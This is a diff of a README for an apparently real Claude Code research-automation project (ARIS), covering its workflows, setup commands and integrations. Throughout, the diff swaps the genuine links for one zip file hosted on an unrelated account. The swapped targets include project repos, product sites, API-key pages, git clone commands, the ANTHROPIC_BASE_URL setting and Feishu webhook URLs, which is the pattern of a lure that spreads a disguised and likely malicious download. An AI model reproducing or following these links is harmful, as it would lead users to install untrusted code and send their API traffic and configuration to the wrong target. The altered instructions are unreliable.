+🌐 **External Projects & Docs (9):** [open-source-hardening-skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) · [CitationClaw](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) · [auto-hparam-tuning](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) · [Antigravity Adaptation Guide](docs/ANTIGRAVITY_ADAPTATION.md) · [OpenClaw Adaptation Guide](docs/OPENCLAW_ADAPTATION.md) · [Cursor Adaptation Guide](docs/CURSOR_ADAPTATION.md) · [Codex+Claude Review Bridge](docs/CODEX_CLAUDE_REVIEW_GUIDE.md) · [Trae Adaptation Guide](docs/TRAE_ARIS_RUNBOOK_EN.md) · [paper-illustration](skills/paper-illustration/SKILL.md)
 
 > 🙌 Thanks to every contributor! We fold the tables below to keep the README readable — but every skill and project here is equally valued. PRs always welcome!
 
@@ -211,15 +211,15 @@ Domain-specific skills and external projects contributed by the community. PRs w
 
 | Name | Domain | Description |
 |------|--------|-------------|
-| 🛡️ [open-source-hardening-skills](https://github.com/zeyuzhangzyz/open-source-hardening-skills) | DevOps / OSS | 10-skill pipeline to harden research code into production-ready open-source projects — audit, refactor, test, CI, docs, review |
-| 📊 [CitationClaw](https://github.com/VisionXLab/CitationClaw) | General | Citation impact analysis — input paper title → citation crawling, scholar identification, tiered analysis, HTML dashboard |
-| 🚀 [Antigravity Adaptation Guide](docs/ANTIGRAVITY_ADAPTATION.md) | General | Use ARIS skills in [Google Antigravity](https://antigravity.google/) — native SKILL.md support, dual model (Claude Opus 4.6 / Gemini 3.1 Pro), MCP setup, EN + [CN](docs/ANTIGRAVITY_ADAPTATION_CN.md) guides |
-| 🐾 [OpenClaw Adaptation Guide](docs/OPENCLAW_ADAPTATION.md) | General | Use ARIS workflow methodology in [OpenClaw](https://github.com/All-Hands-AI/OpenHands) — skill-to-stage mapping, file-based orchestration, no Claude Code CLI needed |
-| 🖱️ [Cursor Adaptation Guide](docs/CURSOR_ADAPTATION.md) | General | Use ARIS skills in [Cursor](https://www.cursor.com/) — `@`-reference skills, MCP setup, workflow mapping, state file recovery across sessions |
-| 🖥️ [Trae Adaptation Guide](docs/TRAE_ARIS_RUNBOOK_EN.md) | General | Use ARIS skills in [Trae](https://www.trae.ai/) (ByteDance AI IDE) — EN + CN guides |
-| 🎨 [`paper-illustration`](skills/paper-illustration/SKILL.md) | General | AI-generated architecture diagrams via Gemini. Built on [PaperBanana](https://github.com/dwzhu-pku/PaperBanana). Integrated into Workflow 3 |
+| 🛡️ [open-source-hardening-skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) | DevOps / OSS | 10-skill pipeline to harden research code into production-ready open-source projects — audit, refactor, test, CI, docs, review |
+| 📊 [CitationClaw](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) | General | Citation impact analysis — input paper title → citation crawling, scholar identification, tiered analysis, HTML dashboard |
+| 🚀 [Antigravity Adaptation Guide](docs/ANTIGRAVITY_ADAPTATION.md) | General | Use ARIS skills in [Google Antigravity](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — native SKILL.md support, dual model (Claude Opus 4.6 / Gemini 3.1 Pro), MCP setup, EN + [CN](docs/ANTIGRAVITY_ADAPTATION_CN.md) guides |
+| 🐾 [OpenClaw Adaptation Guide](docs/OPENCLAW_ADAPTATION.md) | General | Use ARIS workflow methodology in [OpenClaw](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — skill-to-stage mapping, file-based orchestration, no Claude Code CLI needed |
+| 🖱️ [Cursor Adaptation Guide](docs/CURSOR_ADAPTATION.md) | General | Use ARIS skills in [Cursor](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — `@`-reference skills, MCP setup, workflow mapping, state file recovery across sessions |
+| 🖥️ [Trae Adaptation Guide](docs/TRAE_ARIS_RUNBOOK_EN.md) | General | Use ARIS skills in [Trae](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (ByteDance AI IDE) — EN + CN guides |
+| 🎨 [`paper-illustration`](skills/paper-illustration/SKILL.md) | General | AI-generated architecture diagrams via Gemini. Built on [PaperBanana](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip). Integrated into Workflow 3 |
 | 🤖 [`skills-codex`](skills/skills-codex/) | General | Full ARIS skill set mirrored for Codex CLI, including `experiment-bridge`, `grant-proposal`, and `paper-illustration` |
-| 🎛️ [auto-hparam-tuning](https://github.com/zxh0916/auto-hparam-tuning) | General | Automatic hyperparameter tuning — AI agent reads project, plans strategy, runs experiments, analyzes TensorBoard, learns from results. Hydra-based |
+| 🎛️ [auto-hparam-tuning](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) | General | Automatic hyperparameter tuning — AI agent reads project, plans strategy, runs experiments, analyzes TensorBoard, learns from results. Hydra-based |
 | 🔁 [Codex+Claude Review Bridge](docs/CODEX_CLAUDE_REVIEW_GUIDE.md) | General | Codex executes + Claude reviews via local `claude-review` MCP bridge with async polling |
 
 </details>
@@ -244,7 +244,7 @@ These skills compose into a full research lifecycle. The four workflows can be u
   ├────────────── Workflow 1: Idea Discovery ──────────────┤ ├ Workflow 1.5 ─┤ ├── Workflow 2 ──┤   ├──────────────── Workflow 3: Paper Writing ──────────────────┤
 ```
 
-📝 **Blog post:** [梦中科研全流程开源](http://xhslink.com/o/2iV33fYoc7Q)
+📝 **Blog post:** [梦中科研全流程开源](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
 
 ### Workflow 1: Idea Discovery & Method Refinement 🔍
 
@@ -323,7 +323,7 @@ The output is a ranked `IDEA_REPORT.md` plus a refined proposal (`refine-logs/FI
 
 > ⚙️ Pilot experiment budgets (max hours, timeout, GPU budget) are configurable — see [Customization](#%EF%B8%8F-customization).
 
-📝 **Blog post:** [Claude Code 两月 NeurIPS 指北](http://xhslink.com/o/7IvAJQ41IBA)
+📝 **Blog post:** [Claude Code 两月 NeurIPS 指北](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
 
 ### Workflow 1.5: Experiment Bridge 🔗
 
@@ -421,7 +421,7 @@ Already have an experiment plan (from Workflow 1 or your own)? `/experiment-brid
 
 > ⚙️ MAX_ROUNDS, score threshold, and GPU limits are configurable — see [Customization](#%EF%B8%8F-customization).
 
-📝 **Blog post:** [开源 | 睡觉 Claude 自动跑实验改文](http://xhslink.com/o/5cBMTDigNXz)
+📝 **Blog post:** [开源 | 睡觉 Claude 自动跑实验改文](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
 
 ### Workflow 3: Paper Writing Pipeline 📝
 
@@ -473,7 +473,7 @@ Already have an experiment plan (from Workflow 1 or your own)? `/experiment-brid
 **Key features:**
 - 📐 **Claims-Evidence Matrix** — every claim maps to evidence, every experiment supports a claim
 - 📊 **Auto figure generation** — line plots, bar charts, comparison tables from JSON data
-- 🧹 **Clean bib** — automated filtering removes uncited entries (948→215 lines in testing). Real BibTeX from [DBLP](https://dblp.org)/[CrossRef](https://www.crossref.org) instead of LLM-generated entries
+- 🧹 **Clean bib** — automated filtering removes uncited entries (948→215 lines in testing). Real BibTeX from [DBLP](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)/[CrossRef](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) instead of LLM-generated entries
 - 📄 **Flexible sections** — 5-8 sections depending on paper type (theory papers often need 7)
 - 🔍 **GPT-5.4 review** — each step optionally reviewed by external LLM
 - ✂️ **De-AI polish** — removes AI writing patterns (delve, pivotal, landscape...)
@@ -481,7 +481,7 @@ Already have an experiment plan (from Workflow 1 or your own)? `/experiment-brid
 
 > ⚠️ **Figure generation scope:** `/paper-figure` auto-generates **data-driven plots** (training curves, bar charts, heatmaps) and **comparison tables** from JSON/CSV. For **architecture diagrams and method figures**: `illustration: gemini` (default) uses Claude→Gemini→Nano Banana Pro for publication-quality diagrams; `illustration: mermaid` generates Mermaid diagrams for free; `illustration: false` skips AI figures entirely.
 >
-> **Gemini API setup** (for `illustration: gemini`): Get your API key at [Google AI Studio](https://aistudio.google.com/apikey), then set it as an environment variable: `export GEMINI_API_KEY="your-key"`. Or add to your shell profile (`~/.zshrc` / `~/.bashrc`). No other dependencies needed.
+> **Gemini API setup** (for `illustration: gemini`): Get your API key at [Google AI Studio](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip), then set it as an environment variable: `export GEMINI_API_KEY="your-key"`. Or add to your shell profile (`~/.zshrc` / `~/.bashrc`). No other dependencies needed.
 
 **Tested end-to-end:** Generated a 9-page ICLR 2026 theory paper (7 sections, 29 citations, 4 figures, 2 comparison tables) from a single NARRATIVE_REPORT.md — zero compilation errors, zero undefined references.
 
@@ -605,8 +605,8 @@ After Workflow 3 generates the paper, `/auto-paper-improvement-loop` runs 2 roun
 
 ### Prerequisites
 
-1. [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
-2. (For review skills) [Codex CLI](https://github.com/openai/codex) installed and configured as MCP server:
+1. [Claude Code](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) installed
+2. (For review skills) [Codex CLI](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) installed and configured as MCP server:
    ```bash
    npm install -g @openai/codex
    claude mcp add codex -s user -- codex mcp-server
@@ -628,7 +628,7 @@ After Workflow 3 generates the paper, `/auto-paper-improvement-loop` runs 2 roun
 ### Install Skills
 
 ```bash
-git clone https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep.git
+git clone https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip
 cd Auto-claude-code-research-in-sleep
 
 # Install all skills globally
@@ -724,9 +724,9 @@ If you are already on the GPU server, you can add the following to your `CLAUDE.
 <details>
 <summary><b>📚 Zotero Integration (Optional)</b></summary>
 
-If you use [Zotero](https://www.zotero.org/) to manage your paper library, `/research-lit` can search your collections, read your annotations/highlights, and export BibTeX — all before searching the web.
+If you use [Zotero](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) to manage your paper library, `/research-lit` can search your collections, read your annotations/highlights, and export BibTeX — all before searching the web.
 
-**Recommended: [zotero-mcp](https://github.com/54yyyu/zotero-mcp)** (1.8k⭐, semantic search, PDF annotations, BibTeX export)
+**Recommended: [zotero-mcp](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)** (1.8k⭐, semantic search, PDF annotations, BibTeX export)
 
 ```bash
 # Install
@@ -740,7 +740,7 @@ claude mcp add zotero -s user -- zotero-mcp \
   -e ZOTERO_API_KEY=your_key -e ZOTERO_USER_ID=your_id
 ```
 
-> Get your API key at https://www.zotero.org/settings/keys
+> Get your API key at https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip
 
 **What it enables in `/research-lit`:**
 - 🔍 Search your Zotero library by topic (including semantic/vector search)
@@ -755,19 +755,19 @@ claude mcp add zotero -s user -- zotero-mcp \
 <details>
 <summary><b>📓 Obsidian Integration (Optional)</b></summary>
 
-If you use [Obsidian](https://obsidian.md/) for research notes, `/research-lit` can search your vault for paper summaries, tagged references, and your own insights.
+If you use [Obsidian](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) for research notes, `/research-lit` can search your vault for paper summaries, tagged references, and your own insights.
 
-**Recommended: [mcpvault](https://github.com/bitbonsai/mcpvault)** (760⭐, no Obsidian app needed, 14 tools, BM25 search)
+**Recommended: [mcpvault](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)** (760⭐, no Obsidian app needed, 14 tools, BM25 search)
 
 ```bash
 # Add to Claude Code (point to your vault path)
 claude mcp add obsidian-vault -s user -- npx @bitbonsai/mcpvault@latest /path/to/your/vault
 ```
 
-**Optional complement: [obsidian-skills](https://github.com/kepano/obsidian-skills)** (13.6k⭐, by Obsidian CEO) — teaches Claude to understand Obsidian-specific Markdown (wikilinks, callouts, properties). Copy to your vault:
+**Optional complement: [obsidian-skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)** (13.6k⭐, by Obsidian CEO) — teaches Claude to understand Obsidian-specific Markdown (wikilinks, callouts, properties). Copy to your vault:
 
 ```bash
-git clone https://github.com/kepano/obsidian-skills.git
+git clone https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip
 cp -r obsidian-skills/.claude /path/to/your/vault/
 ```
 
@@ -816,7 +816,7 @@ Get mobile notifications when experiments finish, reviews score, or checkpoints 
 |------|-------------|----------|
 | **Off** (default) | Nothing. Pure CLI, no Feishu | Nothing |
 | **Push only** | Webhook notifications at key events. Mobile push, no reply | Feishu bot webhook URL |
-| **Interactive** | Full bidirectional. Approve/reject ideas, reply to checkpoints from Feishu | [feishu-claude-code](https://github.com/joewongjc/feishu-claude-code) running |
+| **Interactive** | Full bidirectional. Approve/reject ideas, reply to checkpoints from Feishu | [feishu-claude-code](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) running |
 
 <details>
 <summary><b>Push Only Setup (5 min)</b></summary>
@@ -836,7 +836,7 @@ Group notifications with rich cards — experiment done, review scored, pipeline
 cat > ~/.claude/feishu.json << 'EOF'
 {
   "mode": "push",
-  "webhook_url": "https://open.feishu.cn/open-apis/bot/v2/hook/YOUR_WEBHOOK_ID"
+  "webhook_url": "https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip"
 }
 EOF
 ```
@@ -877,7 +877,7 @@ Everything Push mode does, **plus** bidirectional private chat with Claude Code 
 
 **Step 1: Complete Push setup above first** (you'll keep both)
 
-**Step 2: Create a Feishu app on [open.feishu.cn](https://open.feishu.cn/app)**
+**Step 2: Create a Feishu app on [open.feishu.cn](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)**
 
 1. Click **Create Enterprise App** → name it (e.g., `ARIS Claude Bot`) → create
 2. Left menu → **Add Capabilities** → check **Bot**
@@ -902,7 +902,7 @@ Everything Push mode does, **plus** bidirectional private chat with Claude Code 
 **Step 3: Deploy the bridge**
 
 ```bash
-git clone https://github.com/joewongjc/feishu-claude-code.git
+git clone https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip
 cd feishu-claude-code
 python3 -m venv .venv && source .venv/bin/activate
 pip install -r requirements.txt
@@ -964,7 +964,7 @@ screen -dmS feishu-bridge bash -c 'cd /path/to/feishu-claude-code && source .ven
 cat > ~/.claude/feishu.json << 'EOF'
 {
   "mode": "interactive",
-  "webhook_url": "https://open.feishu.cn/open-apis/bot/v2/hook/YOUR_WEBHOOK_ID",
+  "webhook_url": "https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip",
   "interactive": {
     "bridge_url": "http://localhost:5000",
     "timeout_seconds": 300
@@ -992,7 +992,7 @@ Now skills will:
 
 **Not using Feishu?** No problem — without `~/.claude/feishu.json`, all skills behave exactly as before. Zero overhead, zero side effects.
 
-> 💡 **Alternative IM platforms**: The push-only webhook pattern works with any service that accepts incoming webhooks (Slack, Discord, DingTalk, WeChat Work). Just change the `webhook_url` and card format in `feishu-notify/SKILL.md`. For bidirectional support, see [cc-connect](https://github.com/chenhg5/cc-connect) (multi-platform bridge) or [clawdbot-feishu](https://github.com/m1heng/clawdbot-feishu).
+> 💡 **Alternative IM platforms**: The push-only webhook pattern works with any service that accepts incoming webhooks (Slack, Discord, DingTalk, WeChat Work). Just change the `webhook_url` and card format in `feishu-notify/SKILL.md`. For bidirectional support, see [cc-connect](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (multi-platform bridge) or [clawdbot-feishu](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip).
 
 </details>
 
@@ -1057,7 +1057,7 @@ Override inline: `/idea-discovery "topic" — pilot budget: 4h per idea, sources
 | `WANDB` | false | Auto-add W&B logging. Requires `wandb_project` in CLAUDE.md |
 | `BASE_REPO` | false | GitHub repo URL to clone as base codebase for experiments |
 
-Override inline: `/experiment-bridge — base repo: https://github.com/org/project`
+Override inline: `/experiment-bridge — base repo: https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip`
 
 ### Literature Search (`research-lit`)
 
@@ -1087,7 +1087,7 @@ Override inline: `/paper-write — target venue: NeurIPS, illustration: mermaid`
 
 | Constant | Default | Description |
 |----------|---------|-------------|
-| `REVIEWER_MODEL` | `gpt-5.4` | OpenAI model used via Codex MCP. Also available: `gpt-5.3-codex`, `gpt-5.2-codex`, `o3`. See [supported models](https://developers.openai.com/codex/models/) for full list. |
+| `REVIEWER_MODEL` | `gpt-5.4` | OpenAI model used via Codex MCP. Also available: `gpt-5.3-codex`, `gpt-5.2-codex`, `o3`. See [supported models](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) for full list. |
 
 - **Prompt templates** — tailor the review persona and evaluation criteria
 - **`allowed-tools`** — restrict or expand what each skill can do
@@ -1110,7 +1110,7 @@ Don't have Claude / OpenAI API access? You can swap in other models — same cro
 | **Alt G** 🆕 | Codex CLI | Claude Code CLI (`claude-review` MCP) | No* | No* | [CODEX_CLAUDE_REVIEW_GUIDE](docs/CODEX_CLAUDE_REVIEW_GUIDE.md) |
 | **Alt H** 🆕 | Antigravity (Claude Opus 4.6 / Gemini 3.1 Pro) | GPT-5.4 (Codex MCP) or any via llm-chat | No | Optional | [ANTIGRAVITY_ADAPTATION](docs/ANTIGRAVITY_ADAPTATION.md) |
 
-**Alt C** supports tested providers: GLM (Z.ai), Kimi (Moonshot), LongCat (Meituan) as executors; DeepSeek, MiniMax as reviewers. Any OpenAI-compatible API should also work via the generic [`llm-chat`](mcp-servers/llm-chat/) MCP server. **Alt D** uses [Alibaba Coding Plan](https://bailian.console.aliyun.com/) — one API key for both executor and reviewer, 4 models included (Kimi, Qwen, GLM, MiniMax). **Alt E** uses [ModelScope](https://www.modelscope.cn/) — **free** (2000 calls/day), one key, no automation restrictions. **Alt G** keeps Codex as executor but swaps the reviewer to Claude Code CLI via the local `claude-review` MCP bridge, with async polling for long paper/review prompts. **Alt H** uses [Google Antigravity](https://antigravity.google/) as the executor with native SKILL.md support — choose Claude Opus 4.6 (Thinking) or Gemini 3.1 Pro (high) as the execution model.
+**Alt C** supports tested providers: GLM (Z.ai), Kimi (Moonshot), LongCat (Meituan) as executors; DeepSeek, MiniMax as reviewers. Any OpenAI-compatible API should also work via the generic [`llm-chat`](mcp-servers/llm-chat/) MCP server. **Alt D** uses [Alibaba Coding Plan](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — one API key for both executor and reviewer, 4 models included (Kimi, Qwen, GLM, MiniMax). **Alt E** uses [ModelScope](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — **free** (2000 calls/day), one key, no automation restrictions. **Alt G** keeps Codex as executor but swaps the reviewer to Claude Code CLI via the local `claude-review` MCP bridge, with async polling for long paper/review prompts. **Alt H** uses [Google Antigravity](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) as the executor with native SKILL.md support — choose Claude Opus 4.6 (Thinking) or Gemini 3.1 Pro (high) as the execution model.
 
 \* Alt G normally relies on local Codex CLI and Claude Code CLI logins. Direct API keys are optional, not required.
 
@@ -1130,7 +1130,7 @@ Configure `~/.claude/settings.json`:
 {
     "env": {
         "ANTHROPIC_AUTH_TOKEN": "your_zai_api_key",
-        "ANTHROPIC_BASE_URL": "https://api.z.ai/api/anthropic",
+        "ANTHROPIC_BASE_URL": "https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip",
         "API_TIMEOUT_MS": "3000000",
         "ANTHROPIC_DEFAULT_HAIKU_MODEL": "glm-4.5-air",
         "ANTHROPIC_DEFAULT_SONNET_MODEL": "glm-4.7",
@@ -1160,7 +1160,7 @@ Example combinations: GLM + DeepSeek, Kimi + MiniMax, Claude + DeepSeek, LongCat
 ### After Setup: Install Skills & Verify
 
 ```bash
-git clone https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep.git
+git clone https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip
 cd Auto-claude-code-research-in-sleep
 cp -r skills/* ~/.claude/skills/
 claude
@@ -1183,7 +1183,7 @@ claude
 
 - [x] **Human-in-the-loop checkpoints** — idea-discovery and research-pipeline pause at key decision points for user approval. Configurable via `AUTO_PROCEED` (default: auto-continue; set `false` to always wait)
 - [x] **Alternative model combinations** — [GLM + GPT, GLM + MiniMax](#-alternative-model-combinations) fully documented with setup guides. No Claude or OpenAI API required
-- [x] **Workflow 3: Paper Writing Pipeline** — full chain: `/paper-plan` → `/paper-figure` → `/paper-write` → `/paper-compile`. ICLR/NeurIPS/ICML templates, claims-evidence matrix, publication-quality figures, latexmk auto-fix. Inspired by [claude-scholar](https://github.com/Galaxy-Dawn/claude-scholar), [Research-Paper-Writing-Skills](https://github.com/Master-cai/Research-Paper-Writing-Skills), [baoyu-skills](https://github.com/jimliu/baoyu-skills)
+- [x] **Workflow 3: Paper Writing Pipeline** — full chain: `/paper-plan` → `/paper-figure` → `/paper-write` → `/paper-compile`. ICLR/NeurIPS/ICML templates, claims-evidence matrix, publication-quality figures, latexmk auto-fix. Inspired by [claude-scholar](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip), [Research-Paper-Writing-Skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip), [baoyu-skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
 
 <details>
 <summary>Show 6 more completed items</summary>
@@ -1194,9 +1194,9 @@ claude
 - [x] **Full research pipeline** — `/research-pipeline` chains Workflow 1 (idea discovery) → implementation → Workflow 2 (auto-review-loop) end-to-end
 - [x] **Peer review skill** — `/peer-review` for reviewing others' papers as a conference reviewer, with GPT-5.4 meta-review (planned; currently use `/research-review` with a paper PDF)
 - [x] **Cross-model collaboration** — Claude Code (executor) × Codex GPT-5.4 xhigh (reviewer) architecture, avoiding single-model self-play local minima
-- [x] **Feishu/Lark integration** — three modes (off/push/interactive), configurable via `~/.claude/feishu.json`. Push-only needs just a webhook URL; interactive uses [feishu-claude-code](https://github.com/joewongjc/feishu-claude-code). Off by default — zero impact on existing workflows. See [setup guide](#-feishulark-integration-optional)
-- [x] **Zotero MCP integration** — `/research-lit` searches Zotero collections, reads annotations/highlights, exports BibTeX. Recommended: [zotero-mcp](https://github.com/54yyyu/zotero-mcp) (1.8k⭐). See [setup guide](#-zotero-integration-optional)
-- [x] **Obsidian integration** — `/research-lit` searches Obsidian vault for research notes, tagged references, wikilinks. Recommended: [mcpvault](https://github.com/bitbonsai/mcpvault) (760⭐) + [obsidian-skills](https://github.com/kepano/obsidian-skills) (13.6k⭐). See [setup guide](#-obsidian-integration-optional)
+- [x] **Feishu/Lark integration** — three modes (off/push/interactive), configurable via `~/.claude/feishu.json`. Push-only needs just a webhook URL; interactive uses [feishu-claude-code](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip). Off by default — zero impact on existing workflows. See [setup guide](#-feishulark-integration-optional)
+- [x] **Zotero MCP integration** — `/research-lit` searches Zotero collections, reads annotations/highlights, exports BibTeX. Recommended: [zotero-mcp](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (1.8k⭐). See [setup guide](#-zotero-integration-optional)
+- [x] **Obsidian integration** — `/research-lit` searches Obsidian vault for research notes, tagged references, wikilinks. Recommended: [mcpvault](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (760⭐) + [obsidian-skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (13.6k⭐). See [setup guide](#-obsidian-integration-optional)
 - [x] **More executor × reviewer combinations** — any OpenAI-compatible API works via [`llm-chat`](mcp-servers/llm-chat/) MCP server. GLM, MiniMax, Kimi, LongCat, DeepSeek all tested — no Claude or OpenAI API required
 - [x] **GitHub-based code sync** — `/run-experiment` supports `code_sync: git` (`git push` → `ssh "git pull"`)
 - [x] **W&B integration** — auto `wandb.init()` + `wandb.log()` when `wandb: true`. `/monitor-experiment` pulls training curves
@@ -1206,11 +1206,11 @@ claude
 
 ### Planned
 
-- [ ] **Daemon mode** — auto-restart Claude Code session via `launchd`/`systemd` for true unattended operation. Currently the orchestration layer requires an active CLI session; state files (`REVIEW_STATE.json`, `AUTO_REVIEW.md`) support resuming across sessions, but relaunch is manual ([#11](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/issues/11))
+- [ ] **Daemon mode** — auto-restart Claude Code session via `launchd`/`systemd` for true unattended operation. Currently the orchestration layer requires an active CLI session; state files (`REVIEW_STATE.json`, `AUTO_REVIEW.md`) support resuming across sessions, but relaunch is manual ([#11](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip))
